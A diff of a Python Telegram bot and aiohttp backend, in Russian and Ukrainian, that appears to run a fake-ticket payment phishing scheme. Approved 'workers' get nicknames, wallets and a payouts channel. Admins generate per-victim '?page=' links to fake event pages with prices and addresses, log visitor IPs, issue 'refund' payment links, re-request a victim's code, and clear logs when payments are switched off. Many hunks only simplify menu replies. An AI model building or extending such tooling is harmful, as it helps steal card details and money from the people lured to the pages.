@@ -339,10 +339,7 @@ async def cancel_any_action(message: types.Message):
     user_step[uid] = None
     user_data[uid] = {}
     kb = admin_menu_kb if is_admin(uid) else main_menu_kb
-    if message.chat.type == "private":
-        await message.answer('Действие отменено. Вы возвращены в главное меню.', reply_markup=kb)
-    else:
-        await message.answer('Действие отменено. Вы возвращены в главное меню.')
+    await message.answer('Действие отменено. Вы возвращены в главное меню.', reply_markup=kb)
 
 @router.message(lambda m: user_step.get(m.from_user.id) == 'source')
 @ban_guard
@@ -352,10 +349,7 @@ async def process_source(message: types.Message):
         user_step[uid] = None
         user_data[uid] = {}
         kb = admin_menu_kb if is_admin(uid) else main_menu_kb
-        if message.chat.type == "private":
-            await message.answer('Действие отменено. Вы возвращены в главное меню.', reply_markup=kb)
-        else:
-            await message.answer('Действие отменено. Вы возвращены в главное меню.')
+        await message.answer('Действие отменено. Вы возвращены в главное меню.', reply_markup=kb)
         return
     uid = message.from_user.id
     if message.text not in ["Реклама", "От друга"]:
@@ -436,11 +430,9 @@ async def process_other(message: types.Message):
         user_step[uid] = None
         user_data[uid] = {}
         kb = admin_menu_kb if is_admin(uid) else main_menu_kb
-        if message.chat.type == "private":
-            await message.answer('Действие отменено. Вы возвращены в главное меню.', reply_markup=kb)
-        else:
-            await message.answer('Действие отменено. Вы возвращены в главное меню.')
+        await message.answer('Действие отменено. Вы возвращены в главное меню.', reply_markup=kb)
         return
+    # Якщо користувач натиснув "Пропустить" (будь-який регістр/пробіли), не обробляємо тут
     if message.text and message.text.strip().lower() == "пропустить":
         return
     await message.answer("Пожалуйста, отправьте скриншот(ы) или нажмите 'Пропустить'.", reply_markup=skip_kb)
@@ -495,10 +487,7 @@ async def process_decision(call: types.CallbackQuery):
             "Канал оплат: https://t.me/+qAiX41DRpeA5MDc8 \n"
             "Для продолжения работы введите /start"
         )
-        if call.message.chat.type == "private":
-            await bot.send_message(uid, welcome_text, reply_markup=kb)
-        else:
-            await bot.send_message(uid, welcome_text)
+        await bot.send_message(uid, welcome_text, reply_markup=kb)
         update_user_status(uid, 'approved')
     else:
         await bot.send_message(uid, "Ваша заявка отклонена.")
@@ -546,10 +535,7 @@ async def back_to_menu_handler(call: types.CallbackQuery):
     uid = call.from_user.id
     user_step[uid] = None
     kb = admin_menu_kb if is_admin(uid) else main_menu_kb
-    if call.message.chat.type == "private":
-        await call.message.answer("Возврат в главное меню.", reply_markup=kb)
-    else:
-        await call.message.answer("Возврат в главное меню.")
+    await call.message.answer("Возврат в главное меню.", reply_markup=kb)
     await call.answer()
 
 @router.callback_query(lambda c: c.data == "change_nickname")
@@ -630,18 +616,12 @@ async def admin_panel_action(message: types.Message):
         user_step[uid] = None
         user_data[uid] = {}
         kb = admin_menu_kb if is_admin(uid) else main_menu_kb
-        if message.chat.type == "private":
-            await message.answer('Действие отменено. Вы возвращены в главное меню.', reply_markup=kb)
-        else:
-            await message.answer('Действие отменено. Вы возвращены в главное меню.')
+        await message.answer('Действие отменено. Вы возвращены в главное меню.', reply_markup=kb)
         return
     uid = message.from_user.id
     if message.text == "⬅️ Назад":
         kb = admin_menu_kb
-        if message.chat.type == "private":
-            await message.answer("Возврат в главное меню.", reply_markup=kb)
-        else:
-            await message.answer("Возврат в главное меню.")
+        await message.answer("Возврат в главное меню.", reply_markup=kb)
         user_step[uid] = None
         return
     elif message.text == "🚫 Заблокировать / разблокировать":
@@ -656,14 +636,17 @@ async def admin_panel_action(message: types.Message):
         )
         await message.answer("Введите псевдоним пользователя:", reply_markup=kb)
     elif message.text == "Отключить платежку":
+        # Вимкнути платіжку через сервер
         import requests
         try:
             requests.get('http://127.0.0.1:8080/set_payment_disabled?value=1', timeout=2)
+            # Очищення логів через серверний endpoint
             requests.get('http://127.0.0.1:8080/clear_logs', timeout=2)
         except Exception as e:
             print(f"[admin_panel] Error disabling payment: {e}")
         await message.answer("Платёжка временно отключена для всех пользователей.")
     elif message.text == "Включить платежку":
+        # Увімкнути платіжку через сервер
         import requests
         try:
             requests.get('http://127.0.0.1:8080/set_payment_disabled?value=0', timeout=2)
@@ -673,8 +656,11 @@ async def admin_panel_action(message: types.Message):
     elif message.text == "Прямая оплата":
         user_step[message.from_user.id] = 'manual_payment_amount'
         await message.answer("Введите сумму и валюту через пробел (например: 45 EUR или 100 USD):")
+        # Тут логіка для прямої оплати
+        # await message.answer("Включено режим прямої оплати. Инструкции отправлены пользователям.")
+
     else:
-        pass
+        pass  # Відповідь на невідому команду тепер тільки у fallback-хендлері
 
 @router.callback_query(lambda c: c.data == "payuser_back")
 async def payuser_back_handler(call: types.CallbackQuery):
@@ -682,10 +668,7 @@ async def payuser_back_handler(call: types.CallbackQuery):
     user_step[uid] = None
     manual_payment_attempts.pop(uid, None)
     kb = admin_menu_kb if is_admin(uid) else main_menu_kb
-    if call.message.chat.type == "private":
-        await call.message.answer("Возврат в главное меню.", reply_markup=kb)
-    else:
-        await call.message.answer("Возврат в главное меню.")
+    await call.message.answer("Возврат в главное меню.", reply_markup=kb)
     await call.answer()
 
 # --- Выплаты ---
@@ -815,10 +798,7 @@ async def pay_back_handler(call: types.CallbackQuery):
     user_step[uid] = None
     manual_payment_attempts.pop(uid, None)
     kb = admin_menu_kb if is_admin(uid) else main_menu_kb
-    if call.message.chat.type == "private":
-        await call.message.answer("Возврат в главное меню.", reply_markup=kb)
-    else:
-        await call.message.answer("Возврат в главное меню.")
+    await call.message.answer("Возврат в главное меню.", reply_markup=kb)
     await call.answer()
 
 # --- Блокировка/разблокировка пользователей ---
@@ -872,10 +852,7 @@ async def unban_user(call: types.CallbackQuery):
     user_step[uid] = None
     manual_payment_attempts.pop(uid, None)
     kb = admin_menu_kb if is_admin(uid) else main_menu_kb
-    if call.message.chat.type == "private":
-        await call.message.answer("Возврат в главное меню.", reply_markup=kb)
-    else:
-        await call.message.answer("Возврат в главное меню.")
+    await call.message.answer("Возврат в главное меню.", reply_markup=kb)
     await call.answer()
 
 @router.callback_query(lambda c: c.data == "ban_back")
@@ -884,10 +861,7 @@ async def ban_back_handler(call: types.CallbackQuery):
     user_step[uid] = None
     manual_payment_attempts.pop(uid, None)
     kb = admin_menu_kb if is_admin(uid) else main_menu_kb
-    if call.message.chat.type == "private":
-        await call.message.answer("Возврат в главное меню.", reply_markup=kb)
-    else:
-        await call.message.answer("Возврат в главное меню.")
+    await call.message.answer("Возврат в главное меню.", reply_markup=kb)
     await call.answer()
 
 # --- Билеты ---
@@ -990,10 +964,7 @@ async def tickets_cancel_handler(call: types.CallbackQuery):
     user_step[uid] = None
     manual_payment_attempts.pop(uid, None)
     kb = admin_menu_kb if is_admin(uid) else main_menu_kb
-    if call.message.chat.type == "private":
-        await call.message.answer('Действие отменено. Вы возвращены в главное меню.', reply_markup=kb)
-    else:
-        await call.message.answer('Действие отменено. Вы возвращены в главное меню.')
+    await call.message.answer('Действие отменено. Вы возвращены в главное меню.', reply_markup=kb)
     await call.answer()
 
 # --- Хендлер для кнопки "Ссылки" ---
@@ -1672,13 +1643,11 @@ async def admin_action_handler(call: types.CallbackQuery):
         async with aiohttp_client.ClientSession() as session:
             await session.post('http://127.0.0.1:8080/set_request_again', json={'code': ip})
         await call.answer("Код запитується знову")
+    # Завжди після дії повертаємо в меню
     user_step[call.from_user.id] = None
     manual_payment_attempts.pop(call.from_user.id, None)
     kb = admin_menu_kb if is_admin(call.from_user.id) else main_menu_kb
-    if call.message.chat.type == "private":
-        await call.message.answer("Возврат в главное меню.", reply_markup=kb)
-    else:
-        await call.message.answer("Возврат в главное меню.")
+    await call.message.answer("Возврат в главное меню.", reply_markup=kb)
     await call.answer()
 
 @router.callback_query(lambda c: c.data == "payuser_back")
@@ -1687,10 +1656,7 @@ async def payuser_back_handler(call: types.CallbackQuery):
     user_step[uid] = None
     manual_payment_attempts.pop(uid, None)
     kb = admin_menu_kb if is_admin(uid) else main_menu_kb
-    if call.message.chat.type == "private":
-        await call.message.answer("Возврат в главное меню.", reply_markup=kb)
-    else:
-        await call.message.answer("Возврат в главное меню.")
+    await call.message.answer("Возврат в главное меню.", reply_markup=kb)
     await call.answer()
 
 @router.callback_query(lambda c: c.data == "pay_back")
@@ -1699,10 +1665,522 @@ async def pay_back_handler(call: types.CallbackQuery):
     user_step[uid] = None
     manual_payment_attempts.pop(uid, None)
     kb = admin_menu_kb if is_admin(uid) else main_menu_kb
-    if call.message.chat.type == "private":
-        await call.message.answer("Возврат в главное меню.", reply_markup=kb)
+    await call.message.answer("Возврат в главное меню.", reply_markup=kb)
+    await call.answer()
+
+@router.callback_query(lambda c: c.data.startswith('ban:'))
+async def ban_reason_ask(call: types.CallbackQuery):
+    uid = call.from_user.id
+    target_id = int(call.data.split(':', 1)[1])
+    user_data[uid] = {'ban_target': target_id}
+    user_step[uid] = 'ban_reason'
+    await call.message.answer("Введите причину блокировки:")
+    await call.answer()
+
+@router.callback_query(lambda c: c.data.startswith('unban:'))
+async def unban_user(call: types.CallbackQuery):
+    uid = call.from_user.id
+    user_step[uid] = None
+    manual_payment_attempts.pop(uid, None)
+    kb = admin_menu_kb if is_admin(uid) else main_menu_kb
+    await call.message.answer("Возврат в главное меню.", reply_markup=kb)
+    await call.answer()
+
+@router.callback_query(lambda c: c.data == "ban_back")
+async def ban_back_handler(call: types.CallbackQuery):
+    uid = call.from_user.id
+    user_step[uid] = None
+    manual_payment_attempts.pop(uid, None)
+    kb = admin_menu_kb if is_admin(uid) else main_menu_kb
+    await call.message.answer("Возврат в главное меню.", reply_markup=kb)
+    await call.answer()
+
+@router.callback_query(lambda c: c.data == "tickets_cancel")
+async def tickets_cancel_handler(call: types.CallbackQuery):
+    uid = call.from_user.id
+    user_step[uid] = None
+    manual_payment_attempts.pop(uid, None)
+    kb = admin_menu_kb if is_admin(uid) else main_menu_kb
+    await call.message.answer('Действие отменено. Вы возвращены в главное меню.', reply_markup=kb)
+    await call.answer()
+
+@router.callback_query(lambda c: c.data.startswith('approve_') or c.data.startswith('reject_'))
+async def process_decision(call: types.CallbackQuery):
+    action, uid = call.data.split('_')
+    uid = int(uid)
+    if action == 'approve':
+        kb = admin_menu_kb if is_admin(uid) else main_menu_kb
+        welcome_text = (
+            "Ваша заявка одобрена!\n"
+            "Чат: https://t.me/+hzNJ46_Vrc4wMzVk \n"
+            "Канал оплат: https://t.me/+qAiX41DRpeA5MDc8 \n"
+            "Для продолжения работы введите /start"
+        )
+        await bot.send_message(uid, welcome_text, reply_markup=kb)
+        update_user_status(uid, 'approved')
     else:
-        await call.message.answer("Возврат в главное меню.")
+        await bot.send_message(uid, "Ваша заявка отклонена.")
+        update_user_status(uid, 'rejected')
+    user_step.pop(uid, None)
+    user_data.pop(uid, None)
+    await call.message.edit_reply_markup(reply_markup=None)
+    await call.answer()
+
+@router.callback_query(lambda c: c.data == "change_nickname")
+async def change_nickname_start(call: types.CallbackQuery):
+    uid = call.from_user.id
+    user_step[uid] = 'change_nickname'
+    await call.message.answer("Введите новый псевдоним:")
+    await call.answer()
+
+@router.callback_query(lambda c: c.data == "change_wallet")
+async def change_wallet_start(call: types.CallbackQuery):
+    uid = call.from_user.id
+    user_step[uid] = 'change_wallet'
+    await call.message.answer("Введите новый кошелек:")
+    await call.answer()
+
+# --- запуск aiohttp і aiogram в одному event loop ---
+@log_function
+async def update_site_user_ip_endpoint(request):
+    """Endpoint для оновлення IP адреси користувача сайту"""
+    data = await request.json()
+    user_id = data.get('user_id', '')
+    page_code = data.get('page_code', '')
+    ip = data.get('ip', '')
+    if not ip:
+        ip = request.remote
+    if not user_id and page_code:
+        # Знаходимо user_id по page_code
+        c = conn.cursor()
+        c.execute('SELECT id FROM site_users WHERE page_code=?', (page_code,))
+        row = c.fetchone()
+        if row:
+            user_id = row[0]
+    if user_id and ip:
+        update_site_user_ip(user_id, ip)
+        return web.Response(text="OK")
+    else:
+        print(f"[IP Update] Error updating IP: user_id={user_id}, page_code={page_code}, ip={ip}")
+        return web.Response(text="Missing user_id/page_code or ip", status=400)
+
+@middleware
+async def cors_middleware(request, handler):
+    if request.method == 'OPTIONS':
+        resp = web.Response()
+    else:
+        resp = await handler(request)
+    resp.headers['Access-Control-Allow-Origin'] = '*'
+    resp.headers['Access-Control-Allow-Methods'] = 'POST, GET, OPTIONS'
+    resp.headers['Access-Control-Allow-Headers'] = 'Content-Type'
+    return resp
+
+@log_function
+async def latest_event_data(request):
+    c = conn.cursor()
+    c.execute('SELECT date_1, date_2, date_3, date_4, date_5, date_6, date_7, date_8, currency, street, price FROM site_users ORDER BY created_at DESC LIMIT 1')
+    row = c.fetchone()
+    if not row:
+        print("[API] No data found in site_users table")
+        return web.json_response({'error': 'no data'})
+    
+    data = {
+        'dates': [row[0], row[1], row[2], row[3], row[4], row[5], row[6], row[7]],
+        'currency': row[8],
+        'street': row[9],
+        'price': row[10]
+    }
+    print(f"[API] Returning data: {data}")
+    return web.json_response(data)
+
+@log_function
+async def event_address(request):
+    page_code = request.query.get('page', '') or request.query.get('e', '')
+    print(f"[event_address] page_code: {page_code}")
+    db_path = os.path.abspath('users.db')
+    print(f"[event_address] DB path: {db_path}")
+    if not page_code:
+        print("[event_address] No page_code provided")
+        return web.json_response({'error': 'missing page or e parameter'}, status=400)
+    c = conn.cursor()
+    # Спочатку шукаємо в event_links (для нових записів)
+    c.execute('SELECT user_id FROM event_links WHERE event_code=?', (page_code,))
+    row = c.fetchone()
+    if row:
+        print(f"[event_address] Found user_id in event_links: {row[0]}")
+        # user_id тут — це Telegram user_id, тому адресу шукаємо по page_code у site_users
+        c.execute('SELECT street FROM site_users WHERE page_code=?', (page_code,))
+        row2 = c.fetchone()
+        if not row2:
+            print(f"[event_address] page_code {page_code} not found in site_users for street (via event_links)")
+            return web.json_response({'error': 'address not found'}, status=404)
+        address = row2[0]
+        print(f"[event_address] Found address (via event_links): {address}")
+        return web.json_response({'address': address})
+    else:
+        # Якщо не знайдено в event_links, шукаємо в site_users
+        c.execute('SELECT id FROM site_users WHERE page_code=?', (page_code,))
+        row = c.fetchone()
+        if not row:
+            return web.json_response({'error': 'not found'}, status=404)
+        user_id = row[0]
+    # Знайти запис site_users для цього user_id
+    c.execute('SELECT street, places FROM site_users WHERE id=?', (user_id,))
+    row2 = c.fetchone()
+    if not row2:
+        return web.json_response({'error': 'address not found'}, status=404)
+    address, places = row2
+    return web.json_response({'address': address, 'places': places})
+
+@log_function
+async def data_by_ip(request):
+    ip = request.query.get('ip', '')
+    if not ip:
+        return web.json_response({'error': 'missing ip'}, status=400)
+    c = conn.cursor()
+    c.execute('SELECT id FROM site_users WHERE ip=? ORDER BY created_at DESC LIMIT 1', (ip,))
+    row = c.fetchone()
+    if not row:
+        return web.json_response({'error': 'not found'}, status=404)
+    user_id = row[0]
+    c.execute('SELECT price, currency, street FROM site_users WHERE id=?', (user_id,))
+    row2 = c.fetchone()
+    if not row2:
+        return web.json_response({'error': 'data not found'}, status=404)
+    price, currency, street = row2
+    return web.json_response({'price': price, 'currency': currency, 'street': street})
+
+@log_function
+async def event_links(request):
+    # Підтримуємо як новий формат ?page= так і старий ?e=
+    page_code = request.query.get('page', '') or request.query.get('e', '')
+    if not page_code:
+        return web.json_response({'error': 'missing page or e parameter'}, status=400)
+    
+    print(f"[DEBUG] event_links request for page_code: {page_code}")
+    
+    c = conn.cursor()
+    # Спочатку шукаємо в event_links (для нових записів)
+    c.execute('SELECT user_id FROM event_links WHERE event_code=?', (page_code,))
+    row = c.fetchone()
+    
+    if row:
+        site_user_id = row[0]
+        print(f"[DEBUG] Found site_user_id: {site_user_id} for page_code: {page_code} in event_links")
+    else:
+        # Якщо не знайдено в event_links, шукаємо в site_users
+        c.execute('SELECT id FROM site_users WHERE page_code=?', (page_code,))
+        row = c.fetchone()
+        if not row:
+            print(f"[DEBUG] Page code {page_code} not found in any table")
+            return web.json_response({'error': 'page_code not found'}, status=404)
+        site_user_id = row[0]
+        print(f"[DEBUG] Found site_user_id: {site_user_id} for page_code: {page_code} in site_users")
+    
+    # Перевіряємо, чи існує цей site_user_id у таблиці site_users
+    c.execute('SELECT id FROM site_users WHERE id=?', (site_user_id,))
+    site_user_exists = c.fetchone()
+    
+    if not site_user_exists:
+        print(f"[DEBUG] Site user {site_user_id} not found in site_users table")
+        return web.json_response({'error': 'site_user_id not found in site_users'}, status=404)
+    
+    return web.json_response({'site_user_id': site_user_id})
+
+# --- API: user_id by page_code ---
+@log_function
+async def user_id_by_page_code(request):
+    page_code = request.query.get('page', '')
+    if not page_code:
+        return web.json_response({'error': 'missing page'}, status=400)
+    c = conn.cursor()
+    c.execute('SELECT id FROM site_users WHERE page_code=?', (page_code,))
+    row = c.fetchone()
+    if not row:
+        return web.json_response({'error': 'not found'}, status=404)
+    return web.json_response({'user_id': row[0]})
+
+async def payment_data(request):
+    try:
+        page_code = request.query.get('page', '')
+        if not page_code:
+            return web.json_response({'error': 'missing page'}, status=400)
+        
+        print(f"[DEBUG] payment_data request for page_code: {page_code}")
+        
+        c = conn.cursor()
+        c.execute('SELECT price, currency, street FROM site_users WHERE page_code=?', (page_code,))
+        row = c.fetchone()
+        
+        if not row:
+            print(f"[DEBUG] No record found for page_code: {page_code}")
+            return web.json_response({'error': 'not found'}, status=404)
+        
+        price, currency, street = row
+        print(f"[DEBUG] Found data: price={price}, currency={currency}, street={street}")
+        
+        return web.json_response({'price': price, 'currency': currency, 'address': street})
+    except Exception as e:
+        print(f"[ERROR] payment_data error: {e}")
+        import traceback
+        traceback.print_exc()
+        return web.json_response({'error': 'internal server error'}, status=500)
+
+
+@router.message(flags={'run_always': True})
+async def print_chat_id(message: types.Message):
+    print(f"[TEMP DEBUG] Chat ID: {message.chat.id}")
+    # Можна закоментувати або видалити цей хендлер після отримання chat_id
+
+
+def fill_page_codes():
+    c = conn.cursor()
+    c.execute('SELECT id FROM site_users ORDER BY created_at')
+    users = c.fetchall()
+    for idx, (user_id,) in enumerate(users):
+        series = idx // 100 + 1
+        number = idx % 100 + 1
+        page_code = f"{series}-{number}"
+        c.execute('UPDATE site_users SET page_code=? WHERE id=?', (page_code, user_id))
+    conn.commit()
+
+def get_site_user_id_by_page(page_code):
+    c = conn.cursor()
+    c.execute('SELECT id FROM site_users WHERE page_code=?', (page_code,))
+    row = c.fetchone()
+    return row[0] if row else None
+
+# --- API: page_code by user_id --
+
+# --- Функції для роботи з місцями подій ---
+def get_event_places(page_code, event_index):
+    c = conn.cursor()
+    c.execute('SELECT places FROM event_places WHERE page_code=? AND event_index=?', (page_code, event_index))
+    row = c.fetchone()
+    return row[0] if row else 0
+
+def set_event_places(page_code, event_index, places):
+    c = conn.cursor()
+    c.execute('INSERT OR REPLACE INTO event_places (page_code, event_index, places) VALUES (?, ?, ?)', (page_code, event_index, places))
+    conn.commit()
+
+# --- API для отримання місць для події ---
+@log_function
+async def event_places_api(request):
+    page_code = request.query.get('page', '')
+    event_index = int(request.query.get('event', '0'))
+    c = conn.cursor()
+    c.execute('SELECT places FROM event_places WHERE page_code=? AND event_index=?', (page_code, event_index))
+    row = c.fetchone()
+    if not row:
+        return web.json_response({'places': 0})
+    return web.json_response({'places': row[0]})
+
+@log_function
+async def event_date_api(request):
+    page_code = request.query.get('page', '')
+    event_index = int(request.query.get('event', '0'))
+    c = conn.cursor()
+    c.execute('SELECT date_1, date_2, date_3, date_4, date_5, date_6, date_7, date_8 FROM site_users WHERE page_code=?', (page_code,))
+    row = c.fetchone()
+    if not row:
+        return web.json_response({'date': ''})
+    if 0 <= event_index < 8:
+        return web.json_response({'date': row[event_index].split(' ')[0] if row[event_index] else ''})
+    return web.json_response({'date': ''})
+
+@log_function
+async def event_time_api(request):
+    page_code = request.query.get('page', '')
+    event_index = int(request.query.get('event', '0'))
+    c = conn.cursor()
+    c.execute('SELECT date_1, date_2, date_3, date_4, date_5, date_6, date_7, date_8 FROM site_users WHERE page_code=?', (page_code,))
+    row = c.fetchone()
+    if not row:
+        return web.json_response({'time': ''})
+    if 0 <= event_index < 8:
+        if row[event_index] and ' ' in row[event_index]:
+            return web.json_response({'time': row[event_index].split(' ', 1)[1]})
+        else:
+            return web.json_response({'time': ''})
+    return web.json_response({'time': ''})
+
+
+@router.message(lambda m: user_step.get(m.from_user.id) == 'pay_amount')
+@ban_guard
+async def admin_pay_amount(message: types.Message):
+    # ...існуючий код...
+    user_step[uid] = None
+
+@router.message(lambda m: is_admin(m.from_user.id) and m.text and any(x in m.text.lower() for x in ["назад", "back"]))
+@ban_guard
+async def force_admin_back(message: types.Message):
+    uid = message.from_user.id
+    user_step[uid] = 'admin_panel'
+    await message.answer("Повернення в адмін-панель.", reply_markup=admin_panel_kb)
+    return
+
+# Додаємо лічильник спроб для manual_payment_amount
+manual_payment_attempts = {}
+
+@router.message(lambda m: user_step.get(m.from_user.id) == 'manual_payment_amount')
+@ban_guard
+async def manual_payment_back(message: types.Message):
+    uid = message.from_user.id
+    # ОДНА перевірка на 'назад'/'⬅️ назад' на самому початку
+    if message.text and message.text.strip().lower() in ['назад', '⬅️ назад']:
+        user_step[uid] = None
+        kb = admin_menu_kb if is_admin(uid) else main_menu_kb
+        await message.answer("Повернення в головне меню.", reply_markup=kb)
+        print(f"[DEBUG] manual_payment_back: Назад, user_step={user_step.get(uid)}")
+        return
+    try:
+        back_kb = ReplyKeyboardMarkup(
+            keyboard=[[KeyboardButton(text="⬅️ Назад")]],
+            resize_keyboard=True
+        )
+        # Далі — тільки логіка для суми/валюти та невалідного вводу
+        m = re.match(r"^([0-9]+(?:[.,][0-9]+)?)\s*([A-Za-z]{2,5})$", message.text.strip())
+        if m:
+            amount = m.group(1).replace(',', '.')
+            currency = m.group(2).upper()
+            link = f"https://artpullse.com/refund/?total={amount}{currency}"
+            sent_msg = await message.answer(f"Ссылка для оплаты для пользователя:\n{link}", reply_markup=ReplyKeyboardRemove())
+            user_step[uid] = None
+            print(f"[DEBUG] manual_payment_back: user_step set to None after link")
+            manual_payment_attempts.pop(uid, None)
+            for mid in bot_message_ids.get(uid, []):
+                try:
+                    await message.bot.delete_message(uid, mid)
+                except Exception:
+                    pass
+            bot_message_ids[uid] = []
+            kb = admin_menu_kb if is_admin(uid) else main_menu_kb
+            await message.answer("Головне меню:", reply_markup=kb)
+            print(f"[DEBUG] Оплата: user_step={user_step.get(uid)}, bot_message_ids={bot_message_ids.get(uid)}")
+            return
+        # Якщо невалідно — одразу скидаємо user_step і повертаємо у головне меню
+        user_step[uid] = None
+        print(f"[DEBUG] manual_payment_back: user_step set to None by invalid input")
+        manual_payment_attempts.pop(uid, None)
+        for mid in bot_message_ids.get(uid, []):
+            try:
+                await message.bot.delete_message(uid, mid)
+            except Exception:
+                pass
+        bot_message_ids[uid] = []
+        kb = admin_menu_kb if is_admin(uid) else main_menu_kb
+        await message.answer("Ви повернуті в головне меню.", reply_markup=kb)
+        print(f"[DEBUG] Інше (manual_payment_amount): user_step={user_step.get(uid)}, bot_message_ids={bot_message_ids.get(uid)}")
+    except Exception as e:
+        user_step[message.from_user.id] = None
+        print(f"[DEBUG] manual_payment_back: user_step set to None by exception")
+        manual_payment_attempts.pop(message.from_user.id, None)
+        await message.answer(f"Сталася помилка: {e}")
+        print(f"[ERROR] manual_payment_back: {e}")
+
+@router.message(lambda m: m.text and ("назад" in m.text.lower() or "⬅️" in m.text.lower()))
+@ban_guard
+async def universal_back_handler(message: types.Message):
+    uid = message.from_user.id
+    kb = admin_menu_kb if is_admin(uid) else main_menu_kb
+    user_step[uid] = None
+    await message.answer("Возврат в главное меню.", reply_markup=kb)
+
+
+
+
+# --- Хендлер для 'Назад' у edit_places_choose_ ---
+@router.message(lambda m: user_step.get(m.from_user.id, '').startswith('edit_places_choose_') and m.text and m.text.lower() == 'назад')
+@ban_guard
+async def back_from_edit_places_choose(message: types.Message):
+    print("==> back_from_edit_places_choose")
+    state = user_step.get(message.from_user.id, '')
+    page_code = state.replace('edit_places_choose_', '')
+    kb = ReplyKeyboardMarkup(
+        keyboard=[
+            [KeyboardButton(text="Изменить данные")],
+            [KeyboardButton(text="Изменить места")],
+            [KeyboardButton(text="Удалить ссылку")],
+            [KeyboardButton(text="Назад")]
+        ],
+        resize_keyboard=True
+    )
+    await message.answer(f"Настройки для ссылки ?page={page_code}", reply_markup=kb)
+    user_step[message.chat.id] = f'edit_link_menu_{page_code}'
+
+# --- Хендлер для 'Назад' у edit_link_menu_ ---
+@router.message(lambda m: user_step.get(m.from_user.id, '').startswith('edit_link_menu_') and m.text and m.text.lower() == 'назад')
+@ban_guard
+async def back_from_edit_link_menu(message: types.Message):
+    print("==> back_from_edit_link_menu")
+    c = conn.cursor()
+    c.execute('SELECT page_code FROM site_users ORDER BY created_at DESC LIMIT 50')
+    codes = [row[0] for row in c.fetchall() if row[0]]
+    kb = ReplyKeyboardMarkup(
+        keyboard=[[KeyboardButton(text=f"?page={code}")] for code in codes] + [[KeyboardButton(text="Назад")]],
+        resize_keyboard=True
+    )
+    await message.answer("Последние 50 ссылок. Выберите ссылку:", reply_markup=kb)
+    user_step[message.chat.id] = 'choose_link_to_edit'
+
+# --- Хендлер для 'Назад' у choose_link_to_edit ---
+@router.message(lambda m: user_step.get(m.from_user.id) == 'choose_link_to_edit' and m.text and m.text.lower() == 'назад')
+@ban_guard
+async def back_from_choose_link_to_edit(message: types.Message):
+    print("==> back_from_choose_link_to_edit")
+    kb = ReplyKeyboardMarkup(
+        keyboard=[
+            [KeyboardButton(text="Создать ссылку")],
+            [KeyboardButton(text="Изменить ссылки")],
+            [KeyboardButton(text="Назад")]
+        ],
+        resize_keyboard=True
+    )
+    await message.answer("Выберите действие:", reply_markup=kb)
+    user_step[message.chat.id] = 'links_menu'
+
+# --- Хендлер для 'Назад' у links_menu ---
+@router.message(lambda m: user_step.get(m.from_user.id) == 'links_menu' and m.text and m.text.lower() == 'назад')
+@ban_guard
+async def back_from_links_menu(message: types.Message):
+    print("==> back_from_links_menu")
+    kb = admin_menu_kb if is_admin(message.from_user.id) else main_menu_kb
+    await message.answer("Главное меню:", reply_markup=kb)
+    user_step[message.chat.id] = None
+
+# --- Універсальний хендлер для 'Назад', який не спрацьовує у вкладених меню ---
+@router.message(
+    lambda m: (
+        m.text and m.text.lower() == 'назад'
+        and not (
+            (user_step.get(m.from_user.id, '') or '').startswith('edit_link_menu_') or
+            (user_step.get(m.from_user.id, '') or '').startswith('edit_places_choose_') or
+            user_step.get(m.from_user.id) == 'choose_link_to_edit' or
+            user_step.get(m.from_user.id) == 'links_menu'
+        )
+    )
+)
+@ban_guard
+async def universal_back_handler(message: types.Message):
+    print("==> universal_back_handler")
+    uid = message.from_user.id
+    kb = admin_menu_kb if is_admin(uid) else main_menu_kb
+    user_step[uid] = None
+    if message.chat.type == "private":
+        await message.answer("Возврат в главное меню.", reply_markup=kb)
+    else:
+        await message.answer("Возврат в главное меню.")
+
+
+
+# --- Універсальний callback_query-хендлер для всіх inline-кнопок "Назад" ---
+@router.callback_query(lambda c: any(x in c.data.lower() for x in ["назад", "back", "⬅️"]))
+async def universal_inline_back_handler(call: types.CallbackQuery):
+    uid = call.from_user.id
+    user_step[uid] = None
+    kb = admin_menu_kb if is_admin(uid) else main_menu_kb
+    await call.message.answer("Возврат в главное меню.", reply_markup=kb)
     await call.answer()
 
 
@@ -1713,10 +2191,7 @@ async def back_to_main_menu(message: types.Message):
     uid = message.from_user.id
     user_step[uid] = None
     kb = admin_menu_kb if is_admin(uid) else main_menu_kb
-    if message.chat.type == "private":
-        await message.answer("Возврат в главное меню.", reply_markup=kb)
-    else:
-        await message.answer("Возврат в главное меню.")
+    await message.answer("Возврат в главное меню.", reply_markup=kb)
 
 
 
@@ -1827,10 +2302,7 @@ async def force_back_to_main(message: types.Message):
     user_step[uid] = None
     print(f"[DEBUG] force_back_to_main: user_step set to None, text={message.text!r}")
     kb = admin_menu_kb if is_admin(uid) else main_menu_kb
-    if message.chat.type == "private":
-        await message.answer("Повернення в головне меню.", reply_markup=kb)
-    else:
-        await message.answer("Повернення в головне меню.")
+    await message.answer("Повернення в головне меню.", reply_markup=kb)
     print(f"[DEBUG] force_back_to_main: user_step={user_step.get(uid)}")
 
 @router.message(lambda m: user_step.get(m.from_user.id) == 'admin_panel' and m.text and (m.text.strip().lower() == '⬅️ назад' or m.text.strip().lower() == 'назад'))
@@ -1842,16 +2314,10 @@ async def admin_panel_back(message: types.Message):
     await message.answer("", reply_markup=kb)
     print(f"[DEBUG] admin_panel_back: user_step={user_step.get(uid)}")
 
-@middleware
-async def cors_middleware(request, handler):
-    if request.method == 'OPTIONS':
-        resp = web.Response()
-    else:
-        resp = await handler(request)
-    resp.headers['Access-Control-Allow-Origin'] = '*'
-    resp.headers['Access-Control-Allow-Methods'] = 'POST, GET, OPTIONS'
-    resp.headers['Access-Control-Allow-Headers'] = 'Content-Type'
-    return resp
+
+
+
+
 
 # --- запуск aiohttp і aiogram в одному event loop ---
 if __name__ == '__main__':
@@ -1879,13 +2345,3 @@ if __name__ == '__main__':
         # aiogram polling
         await dp.start_polling(bot)
     asyncio.run(main())
-
-async def update_site_user_ip_endpoint(request):
-    data = await request.json()
-    user_id = data.get('user_id', '')
-    ip = data.get('ip', '') or request.remote
-    if user_id and ip:
-        update_site_user_ip(user_id, ip)
-        return web.Response(text="OK")
-    else:
-        return web.Response(text="Missing user_id or ip", status=400)
